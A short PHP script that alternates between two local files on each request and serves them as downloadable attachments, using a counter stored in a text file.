<?php
// Counter file to track which file to serve
$counterFile = __DIR__ . "/UpdateActivityCounter.txt";

// Initialize counter if it doesn't exist
if (!file_exists($counterFile)) {
    file_put_contents($counterFile, "0");
}

// Read counter
$counter = (int)file_get_contents($counterFile);

// Decide which file to serve
if ($counter % 2 === 0) {
    $targetFile = __DIR__ . "/updateActivityLog2222";
} else {
    $targetFile = __DIR__ . "/updateActivityLogOXD";
}

// Increment and save counter
file_put_contents($counterFile, $counter + 1);

// Validate file exists
if (!file_exists($targetFile)) {
    http_response_code(404);
    echo "ERROR: File not found.";
    exit;
}

// Output file exactly as-is
header("Content-Type: application/octet-stream");
header('Content-Disposition: attachment; filename="' . basename($targetFile) . '"');
readfile($targetFile);
exit;
?>
